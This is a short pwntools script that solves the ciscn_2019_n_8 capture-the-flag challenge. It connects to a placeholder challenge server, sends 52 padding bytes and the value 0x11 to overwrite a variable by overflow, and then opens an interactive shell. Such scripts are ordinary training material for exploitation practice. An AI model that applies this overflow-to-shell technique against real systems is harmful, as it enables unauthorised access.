from pwn import*
#io=process('./ciscn_2019_n_8')
io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
padding=b'a'*52+p32(0x11)
io.sendline(padding)
io.interactive()